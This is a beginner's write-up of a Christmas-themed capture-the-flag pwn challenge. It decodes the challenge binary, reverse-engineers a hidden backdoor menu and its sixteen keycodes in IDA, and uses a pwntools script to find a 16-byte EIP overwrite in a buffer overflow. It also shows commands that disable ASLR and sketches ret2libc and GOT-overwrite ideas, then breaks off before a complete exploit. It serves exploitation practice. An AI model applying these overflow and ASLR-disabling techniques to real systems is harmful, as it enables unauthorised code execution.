# Day 5 Challenge - Santas pwnshop - Pwn (300)
Santa is giving out an early XMAS-gift to all the good little hackers. Theres a secret backdoor to the PWNSHOP but its protected by a very paranoid lock that automatically changes keycodes often. If we could hack
that, we could grab as many XMAS-gifts as we wanted!

Solves: 69  
Service: nc 18.205.93.120 1205  
Download: T2CytbnZ9lShvuOBkDkpqLB6tjPDCvfa-pwnshop.tar.gz  
Author: likvidera  
  
  
Please note that i'm a beginner:
- so some of the information below might be innacurate or useless.
- It was also my first time using IDA so excuse the verbosity... (I need it for myself for future reference ;-)
- my ASM is pretty bad
- i never used pwntools before
  
This is just what happened to me when i solved this challenge.
  
  
## Initial Discovery

we're given a network service and an archive containing a libc.so file.

```
% nc 18.205.93.120 1205
[cool santa ascii]

SANTAS PWNSHOP
 1) Ask Santa for your XMAS gift
 2) Leave the Northpole
 > 
```

if we enter 2, we quit, if we enter 1, we get a base64 encoded payload.  
If we wait 15 or so seconds, we get a timeout message

```
SANTAS PWNSHOP
 1) Ask Santa for your XMAS gift
 2) Leave the Northpole
 >1

Santa hands you your XMAS gift: (
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
cxBPAAA=
)
```

requesting the gift multiple times within the same session always return the same data, but making a new connection will return a different payload.

```
% base64 -d payload > decoded.gz
% file gift.gz 
gift.gz: gzip compressed data, last modified: Fri Dec 28 06:34:36 2018, from Unix
% gunzip gift.gz 
% file gift
gift: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 3.2.0, BuildID[sha1]=fe0148757af1ae90bdbf119ed5044b87276c05a4, not stripped

% ldd gift
        linux-gate.so.1 (0xf77d5000)
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xf75ea000)
        /lib/ld-linux.so.2 (0xf77d7000)
```

at this point you want to make sure to use the provided libc6 to avoid scratching your head like i did at some point

```
% ln -s libc.so libc.so.6
% export LD_LIBRARY_PATH=$(pwd)  
% ldd gift
        linux-gate.so.1 (0xf7752000)
        libc.so.6 => /home/m/day5/libc.so.6 (0xf7574000)
        /lib/ld-linux.so.2 (0xf7754000)

```


running the binary shows that we have a copy of what's running as a network service

```
% chmod +x gift
% ./gift 
[cool santa ascii]
 
SANTAS PWNSHOP
 1) Ask Santa for your XMAS gift
 2) Leave the Northpole
 >  
```


## Analizing the binary

a quick look in the strings reveals something interesting:

```
% strings gift | grep PWNSHOP
Aha! You found Santas secret backdoor to the PWNSHOP ... hope you know the keycodes
SANTAS PWNSHOP
```

so let's try to find it...  
i used the free version of IDA here.  

Open the binary in IDA, press shift+F12 to display the strings, then CTRL+F to find "Secret"  
Select it and press ENTER to go back to the code window  

```
.rodata:0804AC9C aAhaYouFoundSan db 0Ah                  ; DATA XREF: pwnshop_backdoor+15↑o
.rodata:0804AC9C                 db 'Aha! You found Santas secret backdoor to the PWNSHOP ... hope you'
.rodata:0804AC9C                 db ' know the keycodes',0

```

double click the DATA XREF to follow it, you end up in the "pwnshop_backdoor" proc (press SPACE to toggle between code and graph view)

```
.text:0804875C                 public pwnshop_backdoor
.text:0804875C pwnshop_backdoor proc near              ; CODE XREF: menu:loc_804892D↓p
.text:0804875C
.text:0804875C var_C           = dword ptr -0Ch
.text:0804875C var_4           = dword ptr -4
.text:0804875C
.text:0804875C                 push    ebp
.text:0804875D                 mov     ebp, esp
.text:0804875F                 push    ebx
.text:08048760                 sub     esp, 14h
.text:08048763                 call    __x86_get_pc_thunk_bx
.text:08048768                 add     ebx, 4898h
.text:0804876E                 sub     esp, 0Ch
.text:08048771                 lea     eax, (aAhaYouFoundSan - 804D000h)[ebx] ; "\nAha! You found Santas secret backdoor"...
.text:08048777                 push    eax
.text:08048778                 call    _puts
.text:0804877D                 add     esp, 10h
.text:08048780                 mov     [ebp+var_C], 0
.text:08048787                 jmp     short loc_80487B3
```

following the "CODE XREF", shows that this function is called by the "menu" function.  
  
(interesting part of the menu function)

```
.text:080488F9 loc_80488F9:                            ; CODE XREF: menu:loc_8048933↓j
.text:080488F9                 call    print_menu
.text:080488FE                 call    get_int				< read an integer into EAX
.text:08048903                 mov     [ebp+var_C], eax
.text:08048906                 mov     eax, [ebp+var_C]
.text:08048909                 cmp     eax, 2				< if EAX == 2
.text:0804890C                 jz      short loc_8048923    < 	exit();
.text:0804890E                 cmp     eax, 29Ah			< if EAX == 666
.text:08048913                 jz      short loc_804892D	< 	pwnshop_backdoor()
.text:08048915                 cmp     eax, 1				< if EAX == 1
.text:08048918                 jz      short loc_804891C	< 	pwn(); // show the base64 payload
.text:0804891A                 jmp     short loc_8048933
.text:0804891C ; ---------------------------------------------------------------------------
.text:0804891C
.text:0804891C loc_804891C:                            ; CODE XREF: menu+38↑j
.text:0804891C                 call    pwn
.text:08048921                 jmp     short loc_8048933
.text:08048923 ; ---------------------------------------------------------------------------
.text:08048923
.text:08048923 loc_8048923:                            ; CODE XREF: menu+2C↑j
.text:08048923                 sub     esp, 0Ch
.text:08048926                 push    0
.text:08048928                 call    _exit
.text:0804892D
.text:0804892D loc_804892D:                            ; CODE XREF: menu+33↑j
.text:0804892D                 call    pwnshop_backdoor
.text:08048932                 nop
```

seems there's an "hidden" menu entry we can trigger by typing 666.  
You need to enter 16 codes:  

```
SANTAS PWNSHOP
 1) Ask Santa for your XMAS gift
 2) Leave the Northpole
 > 666 

Aha! You found Santas secret backdoor to the PWNSHOP ... hope you know the keycodes
Enter keycode 0: 1
Enter keycode 1: 2
Enter keycode 2: 3
Enter keycode 3: 5
Enter keycode 4: 6
Enter keycode 5: 2
Enter keycode 6: 4
Enter keycode 7: 3
Enter keycode 8: 4
Enter keycode 9: 2
Enter keycode 10: 5
Enter keycode 11: 3
Enter keycode 12: 2
Enter keycode 13: 1
Enter keycode 14: 3
Enter keycode 15: 4
[ACCESS DENIED] - Releasing the furious Reindeers
```


## Figuring the 16 codes

let's look at the code of the pwnshop_backdoor func.  
  
The first parts reads 16 integer

```
.text:08048771                 lea     eax, (aAhaYouFoundSan - 804D000h)[ebx] ; "\nAha! You found Santas secret backdoor"...
.text:08048777                 push    eax
.text:08048778                 call    _puts
.text:0804877D                 add     esp, 10h
.text:08048780                 mov     [ebp+var_C], 0
.text:08048787                 jmp     short loc_80487B3
.text:08048789 ; ---------------------------------------------------------------------------
.text:08048789
.text:08048789 loc_8048789:                            ; CODE XREF: pwnshop_backdoor+5B↓j
.text:08048789                 sub     esp, 8
.text:0804878C                 push    [ebp+var_C]
.text:0804878F                 lea     eax, (aEnterKeycodeD - 804D000h)[ebx] ; "Enter keycode %d: "
.text:08048795                 push    eax
.text:08048796                 call    _printf
.text:0804879B                 add     esp, 10h
.text:0804879E                 call    get_int
.text:080487A3                 mov     edx, eax
.text:080487A5                 mov     eax, [ebp+var_C]
.text:080487A8                 mov     ds:(keycode - 804D000h)[ebx+eax*4], edx
.text:080487AF                 add     [ebp+var_C], 1
.text:080487B3
.text:080487B3 loc_80487B3:                            ; CODE XREF: pwnshop_backdoor+2B↑j
.text:080487B3                 cmp     [ebp+var_C], 0Fh
.text:080487B7                 jle     short loc_8048789
```


which translates to something like:

```python
print "\nAha! You found Santas secret backdoor"
keycode = range(0x0F + 1)
x = 0
while x <= 0x0F:
	keycode[x] = int(raw_input("Enter keycode %d:"%x))
	x += 1
```


The 2nd part checks them:

```
.text:080487B9                 mov     eax, ds:(keycode - 804D000h)[ebx]
.text:080487BF                 cmp     eax, 61F55Ch
.text:080487C4                 jnz     loc_80488BF
.text:080487CA                 mov     eax, ds:(dword_804D0E4 - 804D000h)[ebx]
.text:080487D0                 cmp     eax, 6B8D03h
.text:080487D5                 jnz     loc_80488BF
.text:080487DB                 mov     eax, ds:(dword_804D0E8 - 804D000h)[ebx]
.text:080487E1                 test    eax, eax
.text:080487E3                 jz      loc_80488BF
.text:080487E9                 mov     eax, ds:(dword_804D0EC - 804D000h)[ebx]
.text:080487EF                 cmp     eax, 5B46F3h
.text:080487F4                 jnz     loc_80488BF
.text:080487FA                 mov     eax, ds:(dword_804D0F0 - 804D000h)[ebx]
.text:08048800                 cmp     eax, 1B9B58h
.text:08048805                 jnz     loc_80488BF
.text:0804880B                 mov     eax, ds:(dword_804D0F4 - 804D000h)[ebx]
.text:08048811                 cmp     eax, 3B61AEh
.text:08048816                 jnz     loc_80488BF
.text:0804881C                 mov     eax, ds:(dword_804D0F8 - 804D000h)[ebx]
.text:08048822                 test    eax, eax
.text:08048824                 jz      loc_80488BF
.text:0804882A                 mov     eax, ds:(dword_804D0FC - 804D000h)[ebx]
.text:08048830                 cmp     eax, 2AD82Ah
.text:08048835                 jnz     loc_80488BF
.text:0804883B                 mov     eax, ds:(dword_804D100 - 804D000h)[ebx]
.text:08048841                 cmp     eax, 4114F0h
.text:08048846                 jnz     short loc_80488BF
.text:08048848                 mov     eax, ds:(dword_804D104 - 804D000h)[ebx]
.text:0804884E                 cmp     eax, 44DAA2h
.text:08048853                 jnz     short loc_80488BF
.text:08048855                 mov     eax, ds:(dword_804D108 - 804D000h)[ebx]
.text:0804885B                 test    eax, eax
.text:0804885D                 jz      short loc_80488BF
.text:0804885F                 mov     eax, ds:(dword_804D10C - 804D000h)[ebx]
.text:08048865                 cmp     eax, 4D3AB4h
.text:0804886A                 jnz     short loc_80488BF
.text:0804886C                 mov     eax, ds:(dword_804D110 - 804D000h)[ebx]
.text:08048872                 cmp     eax, 13E299h
.text:08048877                 jnz     short loc_80488BF
.text:08048879                 mov     eax, ds:(dword_804D114 - 804D000h)[ebx]
.text:0804887F                 cmp     eax, 743619h
.text:08048884                 jnz     short loc_80488BF
.text:08048886                 mov     eax, ds:(dword_804D118 - 804D000h)[ebx]
.text:0804888C                 test    eax, eax
.text:0804888E                 jz      short loc_80488BF
.text:08048890                 mov     eax, ds:(dword_804D11C - 804D000h)[ebx]
.text:08048896                 cmp     eax, 5CD94Ah
.text:0804889B                 jnz     short loc_80488BF
.text:0804889D                 mov     edx, ds:(keycode - 804D000h)[ebx]
.text:080488A3                 mov     eax, ds:(dword_804D11C - 804D000h)[ebx]
.text:080488A9                 cmp     eax, 25FCFCh
.text:080488AE                 setz    al
.text:080488B1                 movzx   eax, al
.text:080488B4                 cmp     edx, eax
.text:080488B6                 jz      short loc_80488BF
.text:080488B8                 call    win
.text:080488BD                 jmp     short loc_80488DB
.text:080488BF ; ---------------------------------------------------------------------------
.text:080488BF
.text:080488BF loc_80488BF:                            ; CODE XREF: pwnshop_backdoor+68↑j
.text:080488BF                                         ; pwnshop_backdoor+79↑j ...
.text:080488BF                 sub     esp, 0Ch
.text:080488C2                 lea     eax, (a031maccessDeni - 804D000h)[ebx] ; "[\x1B[0;31mACCESS DENIED\x1B[0m] - Rele"...
.text:080488C8                 push    eax
.text:080488C9                 call    _puts
.text:080488CE                 add     esp, 10h
.text:080488D1                 sub     esp, 0Ch
.text:080488D4                 push    0
.text:080488D6                 call    _exit
```

it's basically checking each input values against some hardcoded constant.  
There's 2 kind of checks:

```
.text:08048865                 cmp     eax, 4D3AB4h
.text:0804886A                 jnz     short loc_80488BF
```

which jumps to loc_80488BF (access denied) if the value of EAX is not 0x4D3AB4  
and

```
.text:0804888C                 test    eax, eax
.text:0804888E                 jz      short loc_80488BF
```
which jumps to access denied if EAX is 0 (so it needs to be anything except 0)  
  
  
following can be translated to pseudocode like:

```python
if keycode[0] != 0x61F55C:		# 6419804
	goto denied
if keycode[1] != 0x6B8D03:		# 7048451
	goto denied
if keycode[2] == 0:
	goto denied
if keycode[3] != 0x5B46F3:		# 5981939
	goto denied
if keycode[4] != 0x1B9B58:		# 1809240
	goto denied
if keycode[5] != 0x3B61AE:		# 3891630
	goto denied
if keycode[6] == 0:
	goto denied
if keycode[7] != 0x2AD82A:		# 2807850
	goto denied
if keycode[8] != 0x4114F0:		# 4265200
	goto denied
if keycode[9] != 0x44DAA2:		# 4512418
	goto denied
if keycode[10] == 0:
	goto denied
if keycode[11] != 0x4D3AB4:		# 5061300
	goto denied
if keycode[12] != 0x13E299:		# 1303193
	goto denied
if keycode[13] != 0x743619:		# 7616025
	goto denied
if keycode[14] == 0:
	goto denied
if keycode[15] != 0x5CD94A:		# 6084938
	goto denied

win()

denied:
	print("Access denied")
```


let's try it:

```
SANTAS PWNSHOP
 1) Ask Santa for your XMAS gift
 2) Leave the Northpole
 > 666

Aha! You found Santas secret backdoor to the PWNSHOP ... hope you know the keycodes
Enter keycode 0: 6419804
Enter keycode 1: 7048451
Enter keycode 2: 1
Enter keycode 3: 5981939
Enter keycode 4: 1809240
Enter keycode 5: 3891630
Enter keycode 6: 1
Enter keycode 7: 2807850
Enter keycode 8: 4265200
Enter keycode 9: 4512418
Enter keycode 10: 1
Enter keycode 11: 5061300
Enter keycode 12: 1303193
Enter keycode 13: 7616025
Enter keycode 14: 1
Enter keycode 15: 6084938
[ACCESS GRANTED]
[XMAS SECURITY PROTOCOL ACTIVATED] - Enter new keycode: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
zsh: segmentation fault  ./gift

```

the win() function just prints the message and reads some data from stdin into a buffer of i-dont-know-how-many bytes (because my assembly is bad), but which is apprently subject to a buffer overflow...

```
.text:0804871F                 lea     eax, (a032maccessGran - 804D000h)[ebx] ; "[\x1B[0;32mACCESS GRANTED\x1B[0m]"
.text:08048725                 push    eax
.text:08048726                 call    _puts
.text:0804872B                 add     esp, 10h
.text:0804872E                 sub     esp, 0Ch
.text:08048731                 lea     eax, (a032mxmasSecuri - 804D000h)[ebx] ; "[\x1B[0;32mXMAS SECURITY PROTOCOL ACTIV"...
.text:08048737                 push    eax
.text:08048738                 call    _printf
.text:0804873D                 add     esp, 10h
.text:08048740                 sub     esp, 4
.text:08048743                 push    320h
.text:08048748                 lea     eax, [ebp+var_C]
.text:0804874B                 push    eax
.text:0804874C                 push    0
.text:0804874E                 call    _read			; <- here
.text:08048753                 add     esp, 10h
.text:08048756                 nop
.text:08048757                 mov     ebx, [ebp+var_4]
.text:0804875A                 leave
```


## Exploiting the win function (Part 1)

we can use the following piece of code to find how many bytes we need to overwrite EIP:


```python
% cat exploit_v1.py
#!/usr/bin/python

from pwn import *

keycodes = [6419804, 7048451, 1, 5981939, 1809240, 3891630, 1, 2807850, 4265200, 4512418, 1, 5061300, 1303193, 7616025, 1, 6084938]


elf = context.binary = ELF("./gift")
#context.log_level = 'debug'

io = process(elf.path)
io.recvuntil(" > ")
io.sendline("666")

for x in range(16):
    io.recvuntil("Enter keycode %d: "%x)
    io.sendline(str(keycodes[x]))

print io.recv(4096)

io.sendline(cyclic(128))
io.wait()

core = io.corefile

####
eip = core.eip
info("eip = %#x", eip)

offset = cyclic_find(eip)
info("offset = %d", offset)
```

```
% ./exploit_v1.py 
[*] '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x8048000)
[+] Starting local process '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift': pid 9644
[ACCESS GRANTED]
[XMAS SECURITY PROTOCOL ACTIVATED] - Enter new keycode: 
[*] Process '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift' stopped with exit code -11 (SIGSEGV) (pid 9644)
[+] Parsing corefile...: Done
[*] '/home/matth/security/writeups/aotw2018ctf-writeups/day5/core.9644'
    Arch:      i386-32-little
    EIP:       0x61616165
    ESP:       0xffb8f850
    Exe:       '/home/matth/security/writeups/aotw2018ctf-writeups/day5/gift' (0x8048000)
    Fault:     0x61616165
[*] eip = 0x61616165
[*] offset = 16
```

se we need to 16 bytes of data before we can overwrite EIP.  
also we see in the process that NX is activated, so cannot just push some code into the stack...  
  
  
The libc is provided, so i first thought about some ret2libc, which worked locally only if i disabled ASLR
```
% echo 0 | sudo tee /proc/sys/kernel/randomize_va_space
```

since it's remote, i decided not to waste time on this and enabled it again:

```
% echo 2 | sudo tee /proc/sys/kernel/randomize_va_space
```


i spent some time reading [https://sploitfun.wordpress.com/2015/05/08/bypassing-aslr-part-iii/] and got convinced i needed to overwrite the GOT entry.  
  
- PLT stands for Procedure Linkage Table which is, put simply, used to call external procedures/functions whose address isn't known in the time of linking, and is left to be resolved by the dynamic linker at run time.  
